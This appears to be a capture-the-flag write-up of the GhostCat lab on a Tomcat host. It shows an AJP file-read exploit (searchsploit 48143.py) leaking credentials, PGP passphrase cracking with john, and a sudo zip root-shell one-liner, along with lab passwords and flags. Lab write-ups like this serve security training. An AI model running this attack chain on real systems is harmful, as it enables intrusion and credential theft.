### IP
`10.10.200.229`


# Reconnaissance

### nmap

`nmap -sC -sV `

```
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)
|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)
|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Here, we can see that the apache tomcat application has jserv listening on port 8009 for all IPs. 

We can do `searchsploit ajp` to find an exploit that will allow us to read sensitive configuration files.

The following lets us mirror the exploit:
`searchsploit -m multiple/webapps/48143.py`


Running the exploit provides us with what looks like credentials
`python2 48143.py -p 8009 10.10.77.159`
```
Getting resource at ajp13://10.10.77.159:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```
`skyfuck:8730281lkjlkjdqlksalks`


Once we log in with ssh, we get the user flag in one of the home directories:
`THM{GhostCat_1s_so_cr4sy}`

# Privilege Escalation

### Hash cracking

We also see a pgp-encrypted file and a pgp private key. Unfortunately, the private key has a password.

We can try to crack the password by first generating a hash

`gpg2john tryhackme.asc > gpg.hash`

and then by using that hash with the rockyou wordlist

`john --format=gpg gpg.hash -w=/usr/share/wordlists/rockyou.txt`

We get the following credentials:

`tryhackme:alexandru`

We can use `gpg --import tryhackme.asc` and the password `alexandru` to import the private key

Running `gpg -d credential.gpg` will decrypt the file using our imported private key and will show us login info for the merlin user:

`merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

### sudoers

The merlin user can run `zip` as root with no password:
`sudo -l`
```
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

```

Using [this](https://gtfobins.github.io/gtfobins/zip/), we can get a shell as root:

`sudo zip a /etc/bash.bashrc -T -TT 'bash #'`

From here, we can get the root flag

`THM{Z1P_1S_FAKE}`

